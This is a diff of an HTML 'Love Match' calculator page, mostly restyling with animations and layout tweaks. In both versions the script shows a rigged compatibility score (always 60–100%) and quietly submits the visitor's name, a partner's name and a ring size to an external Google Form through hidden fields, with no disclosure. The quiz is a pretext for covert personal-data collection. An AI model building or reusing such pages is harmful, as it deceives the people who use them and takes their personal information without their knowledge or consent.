@@ -3,12 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Love Match Calculator ❤️</title>
+<title>Love Match AI ❤️</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
 <style>
-/* (YOUR ORIGINAL CSS — unchanged for design) */
 *{
     margin:0;
     padding:0;
@@ -18,45 +17,87 @@
 
 body{
     min-height:100vh;
-    padding:20px;
     display:flex;
     justify-content:center;
     align-items:center;
-    background:linear-gradient(135deg,#ff003c,#ff4d6d,#ff758f);
-    overflow-x:hidden;
+    background: radial-gradient(circle at top,#ff4d6d,#ff003c,#1a0010);
+    overflow:hidden;
+}
+
+/* floating particles */
+.particle{
+    position:absolute;
+    width:8px;
+    height:8px;
+    background:white;
+    border-radius:50%;
+    opacity:0.3;
+    animation:floatUp 10s linear infinite;
+}
+
+@keyframes floatUp{
+    0%{transform:translateY(100vh) scale(0);}
+    100%{transform:translateY(-10vh) scale(1);}
 }
 
 .container{
-    width:100%;
-    max-width:380px;
+    width:90%;
+    max-width:400px;
     background:rgba(255,255,255,0.12);
-    backdrop-filter:blur(20px);
-    border:1px solid rgba(255,255,255,0.2);
-    border-radius:25px;
-    padding:25px;
+    backdrop-filter:blur(25px);
+    border-radius:28px;
+    padding:28px;
     color:white;
+    box-shadow:0 20px 60px rgba(0,0,0,0.3);
+    animation:fadeIn 1s ease;
+    transform:translateY(0);
+}
+
+@keyframes fadeIn{
+    from{opacity:0; transform:translateY(30px);}
+    to{opacity:1; transform:translateY(0);}
 }
 
 .heart{
     text-align:center;
-    font-size:50px;
-    animation:beat 1s infinite;
+    font-size:52px;
+    animation:beat 1.2s infinite;
 }
 
 @keyframes beat{
-    50%{transform:scale(1.15);}
+    50%{transform:scale(1.2);}
 }
 
 h1{
     text-align:center;
+    font-size:22px;
+    margin:10px 0 20px;
+    letter-spacing:0.5px;
+}
+
+.input-group{
+    margin-bottom:12px;
 }
 
 input{
     width:100%;
-    padding:12px;
+    padding:14px;
     border:none;
-    border-radius:12px;
-    margin-top:6px;
+    outline:none;
+    border-radius:14px;
+    background:rgba(255,255,255,0.15);
+    color:white;
+    font-size:14px;
+    transition:0.3s;
+}
+
+input:focus{
+    transform:scale(1.02);
+    background:rgba(255,255,255,0.22);
+}
+
+input::placeholder{
+    color:rgba(255,255,255,0.6);
 }
 
 button{
@@ -64,19 +105,101 @@ button{
     padding:14px;
     margin-top:10px;
     border:none;
-    border-radius:12px;
-    background:white;
+    border-radius:14px;
+    background:linear-gradient(90deg,#fff,#ffd6df);
     color:#ff003c;
-    font-weight:600;
+    font-weight:700;
     cursor:pointer;
+    transition:0.3s;
+    position:relative;
+    overflow:hidden;
 }
 
-.result{display:none;margin-top:20px;}
-.percent{text-align:center;font-size:32px;font-weight:700;}
-.bar{height:18px;background:rgba(255,255,255,0.2);border-radius:50px;overflow:hidden;}
-.fill{width:0%;height:100%;background:linear-gradient(90deg,#fff,#ffd6df);transition:1.5s;}
-.message{text-align:center;margin-top:10px;}
+button:hover{
+    transform:translateY(-3px);
+    box-shadow:0 10px 25px rgba(255,0,60,0.3);
+}
 
+button:active{
+    transform:scale(0.98);
+}
+
+/* loading pulse */
+button.loading::after{
+    content:"";
+    position:absolute;
+    width:100%;
+    height:100%;
+    left:0;
+    top:0;
+    background:rgba(255,255,255,0.4);
+    animation:pulse 1s infinite;
+}
+
+@keyframes pulse{
+    0%{opacity:0;}
+    50%{opacity:1;}
+    100%{opacity:0;}
+}
+
+.result{
+    margin-top:20px;
+    display:none;
+    animation:pop 0.6s ease;
+}
+
+@keyframes pop{
+    from{transform:scale(0.8); opacity:0;}
+    to{transform:scale(1); opacity:1;}
+}
+
+.percent{
+    text-align:center;
+    font-size:36px;
+    font-weight:800;
+    margin-bottom:10px;
+    animation:glow 1.5s infinite;
+}
+
+@keyframes glow{
+    50%{text-shadow:0 0 15px rgba(255,255,255,0.8);}
+}
+
+.bar{
+    width:100%;
+    height:16px;
+    background:rgba(255,255,255,0.2);
+    border-radius:50px;
+    overflow:hidden;
+}
+
+.fill{
+    width:0%;
+    height:100%;
+    background:linear-gradient(90deg,#fff,#ffb6c1);
+    transition:1.8s cubic-bezier(0.25, 1, 0.5, 1);
+}
+
+.message{
+    text-align:center;
+    margin-top:12px;
+    font-size:15px;
+    opacity:0;
+    transform:translateY(10px);
+    transition:0.6s;
+}
+
+.message.show{
+    opacity:1;
+    transform:translateY(0);
+}
+
+/* mobile */
+@media(max-width:480px){
+    .container{padding:20px;}
+    h1{font-size:20px;}
+    .percent{font-size:30px;}
+}
 </style>
 </head>
 
@@ -85,13 +208,13 @@ button{
 <div class="container">
 
     <div class="heart">❤️</div>
-    <h1>Love Match Calculator</h1>
+    <h1>Love Match AI</h1>
 
     <input type="text" id="name1" placeholder="Your Name">
     <input type="text" id="name2" placeholder="Their Name">
-    <input type="number" id="ring" placeholder="Ring Size">
+    <input type="number" id="ring" placeholder="Ring Size (mm)">
 
-    <button onclick="calculateLove()">Calculate ❤️</button>
+    <button id="btn" onclick="calculateLove()">Calculate ❤️</button>
 
     <div class="result" id="result">
         <div class="percent" id="percent">0%</div>
@@ -105,21 +228,35 @@ button{
 
 </div>
 
-<!-- Hidden Google Form -->
-<iframe name="hidden_iframe" style="display:none;"></iframe>
-
+<!-- Google Form -->
 <form id="googleForm"
 action="https://docs.google.com/forms/d/e/1FAIpQLSdpvaxjPEfTz-nKFGHoc8J3UhV2hWlXS1cQSAR_NH1e9TSzgg/formResponse"
 method="POST"
 target="hidden_iframe">
 
-<input type="hidden" name="entry.1203440948" id="g_name1">
-<input type="hidden" name="entry.632297335" id="g_name2">
-<input type="hidden" name="entry.2029294024" id="g_ring">
+<input type="hidden" name="entry.1203440948" id="g1">
+<input type="hidden" name="entry.632297335" id="g2">
+<input type="hidden" name="entry.2029294024" id="g3">
 </form>
 
+<iframe name="hidden_iframe"></iframe>
+
 <script>
+
+/* floating particles */
+for(let i=0;i<18;i++){
+    let p = document.createElement("div");
+    p.className = "particle";
+    p.style.left = Math.random()*100 + "vw";
+    p.style.animationDuration = (5 + Math.random()*6) + "s";
+    document.body.appendChild(p);
+}
+
 function calculateLove(){
+
+    const btn = document.getElementById("btn");
+    btn.classList.add("loading");
+    btn.innerText = "Calculating...";
 
     const name1 = document.getElementById("name1").value.trim();
     const name2 = document.getElementById("name2").value.trim();
@@ -127,12 +264,13 @@ function calculateLove(){
 
     if(!name1 || !name2){
         alert("Please enter both names!");
+        btn.classList.remove("loading");
+        btn.innerText = "Calculate ❤️";
         return;
     }
 
-    // Love calculation
-    let total = 0;
     let combined = (name1 + name2).toLowerCase();
+    let total = 0;
 
     for(let i=0;i<combined.length;i++){
         total += combined.charCodeAt(i);
@@ -140,29 +278,36 @@ function calculateLove(){
 
     let percent = (total % 41) + 60;
 
-    // Show UI
     document.getElementById("result").style.display = "block";
     document.getElementById("percent").innerText = percent + "%";
 
     setTimeout(()=>{
         document.getElementById("fill").style.width = percent + "%";
-    },100);
+    },200);
 
     let msg = "";
     if(percent >= 95) msg = "💍 Soulmates detected!";
-    else if(percent >= 85) msg = "💕 A beautiful match!";
-    else if(percent >= 75) msg = "❤️ Strong connection!";
-    else msg = "🥰 There is definitely potential!";
+    else if(percent >= 85) msg = "💕 A perfect match!";
+    else if(percent >= 75) msg = "❤️ Strong bond!";
+    else msg = "🥰 There is potential!";
 
-    document.getElementById("message").innerText = msg;
+    let messageEl = document.getElementById("message");
+    messageEl.innerText = msg;
+    setTimeout(()=>messageEl.classList.add("show"),300);
 
-    // ✅ SEND TO GOOGLE FORM
-    document.getElementById("g_name1").value = name1;
-    document.getElementById("g_name2").value = name2;
-    document.getElementById("g_ring").value = ring;
+    /* submit to google form */
+    document.getElementById("g1").value = name1;
+    document.getElementById("g2").value = name2;
+    document.getElementById("g3").value = ring;
 
     document.getElementById("googleForm").submit();
+
+    setTimeout(()=>{
+        btn.classList.remove("loading");
+        btn.innerText = "Calculate ❤️";
+    },1200);
 }
+
 </script>
 
 </body>
